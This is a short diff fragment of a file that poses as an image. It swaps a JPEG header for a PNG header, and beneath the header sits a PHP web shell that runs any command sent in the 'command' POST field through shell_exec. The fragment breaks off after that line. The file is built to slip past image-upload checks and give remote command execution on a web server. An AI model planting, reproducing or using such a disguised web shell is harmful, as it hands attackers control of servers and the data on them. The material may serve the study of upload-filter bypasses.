@@ -1,4 +1,5 @@
-Ø¯Øˆ JFIF  H H  Øó C 
+äPNG
+
 <?php
 if (isset($_POST["command"])) {
 	$message = shell_exec($_POST["command"]);
